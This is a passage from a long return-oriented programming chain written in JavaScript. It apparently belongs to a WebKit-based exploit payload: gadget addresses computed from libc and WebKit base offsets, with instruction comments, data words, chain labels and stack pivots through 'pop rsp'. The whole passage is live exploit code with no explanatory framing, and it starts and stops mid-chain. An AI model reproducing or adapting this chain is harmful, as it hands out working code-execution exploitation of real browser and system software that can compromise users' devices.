libc_base+792472 //pop rcx
]);
//L145:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+5202439, //and rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L147:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L148:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+71872, //L149
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L149:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+71928, //L151
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L151:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+72040, //L153
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L153:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L155:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+72160, //L158
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+72144, //L156
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L156:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L158:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+72328, //L161
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+72344, //L162
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+72312, //L159
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+72296, //L160
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L160:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L159:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L161:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L162:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+72440, //L164
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+72424, //L163
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L163:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L164:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L165:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L166:
db([24, 0]); // 0x18
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+72592, //L167
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L167:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+72648, //L169
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L169:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+72784, //L173
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+72752, //L172
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L172:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L171:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L173:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+72896, //L174
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+72928, //L176
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+72912, //L175
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L174:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L175:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L176:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73024, //L177
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+73040, //L178
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L177:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L178:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73152, //L179
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+73136, //L180
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L180:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L179:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+73240, //L182
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+73224, //L181
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L181:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L182:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73336, //L183
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+73352, //L184
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L183:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L184:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73464, //L185
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+73448, //L186
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L186:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L185:
db([0, 0]); // 0x0
//___builtin_bswap64:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73536, //L188
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L188:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+73600, //L190
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L190:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([16, 0]); // 0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+73680, //L191
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L191:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L193:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+73752, //L194
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L194:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L196:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L197:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L199:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+73888, //L201
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L200:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L201:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+73944, //L203
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L203:
db([0, 0]); // 0x0
//L202:
set_gadgets([
libc_base+793877, //pop rsi
ropchain+73992, //L205
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L205:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L207:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+74112, //L210
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+74096, //L208
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L208:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L210:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+74280, //L213
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+74296, //L214
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+74264, //L211
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+74248, //L212
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L212:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L211:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L213:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L214:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+74368, //L215
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+74384, //L216
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L215:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L216:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+74480, //L218
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+74464, //L217
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L217:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L218:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+74560, //L220
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L220:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L219:
db([4, 0]); // 0x4
set_gadget(libc_base+206806,); //pop rdi
//L221:
db([4, 0]); // 0x4
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+74696, //L222
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+74728, //L224
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+74712, //L223
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L222:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L223:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L224:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+48555, //setl al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+74896, //L226
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+74912, //L227
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+74880, //L225
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L225:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L226:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L227:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+75016, //L229
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+75064, //L232
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+75048, //L231
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L229:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L230:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L231:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L232:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+75176, //L233+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+75168, //L233
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L233:
db([0, 0]); // 0x0
set_gadgets([
ropchain+75192, //L233+24
ropchain+75208, //L228
libc_base+811575, //pop rsp
ropchain+75224, //L234
//L228:
libc_base+811575, //pop rsp
ropchain+85616, //L235
//L234:
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L236:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L238:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+75360, //L241
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+75344, //L239
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L239:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L241:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+75504, //L244
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+75472, //L242
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+75488, //L243
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L242:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L243:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L244:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+75576, //L245
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L245:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+75632, //L247
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L247:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L249:
db([7, 0]); // 0x7
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+75760, //L250
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L250:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L252:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+75880, //L255
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+75864, //L253
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L253:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L255:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+76048, //L258
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76064, //L259
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+76032, //L256
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+76016, //L257
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L257:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L256:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L258:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L259:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+76168, //L260
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76200, //L262
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+76184, //L261
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L260:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L261:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L262:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+76304, //L263
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76320, //L264
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L263:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L264:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+76408, //L265
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L265:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+76464, //L267
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L267:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+76600, //L270
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76616, //L271
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+76584, //L269
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L269:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L270:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L271:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+76776, //L275
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+76728, //L273
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+76760, //L274
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L273:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L272:
db([24, 0]); // 0x18
set_gadget(libc_base+206806,); //pop rdi
//L274:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L275:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+76832, //L277
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L277:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+76936, //L279
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76968, //L280
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+76952, //L278
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L279:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L278:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L280:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+77128, //L284
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+77080, //L282
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77112, //L283
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L282:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L281:
db([24, 0]); // 0x18
set_gadget(libc_base+206806,); //pop rdi
//L283:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L284:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+77184, //L286
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L286:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+77288, //L288
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+77320, //L289
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77304, //L287
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L288:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L287:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L289:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+77480, //L293
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+77432, //L291
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77464, //L292
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L291:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L290:
db([24, 0]); // 0x18
set_gadget(libc_base+206806,); //pop rdi
//L292:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L293:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+77536, //L295
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L295:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+77640, //L297
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+77672, //L298
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77656, //L296
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L297:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L296:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L298:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+77744, //L299
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+77760, //L300
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L299:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L300:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+77848, //L301
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77880, //L304
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L301:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L303:
db([4294967283, 4294967295]); // -0xd
set_gadget(libc_base+206806,); //pop rdi
//L304:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L306:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+78024, //L309
